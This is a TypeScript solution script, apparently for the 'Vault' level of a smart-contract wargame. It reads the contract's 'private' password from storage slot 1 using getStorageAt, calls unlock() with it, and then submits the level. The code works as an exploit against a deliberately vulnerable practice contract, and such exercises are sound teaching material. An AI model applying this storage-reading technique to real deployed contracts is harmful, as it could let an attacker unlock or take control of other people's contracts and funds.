// Runtime Environment's members available in the global scope.
import { ethers, Signer } from "ethers";
import { Interface } from "ethers/lib/utils";
import { getSigner } from "./signer";
import { createLevel, submitLevel } from "./utils";

async function main() {
  
  const signer = getSigner();
  const level = await createLevel(signer, 'vault');

  const passwordHex = await GetStorage(1);
  const ct = new Interface(abi);
  const data = ct.encodeFunctionData("unlock", [passwordHex]);
  const tx = await signer.sendTransaction({ to: level, data: data, gasLimit: 620000 });
  console.log(await tx.wait());

  async function GetStorage(position: number) {
    return await signer.provider?.getStorageAt(level, position) || "";
  }
  await submitLevel(signer, level);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "_password",
        "type": "bytes32"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "_password",
        "type": "bytes32"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xec9b5b3a"
  }
]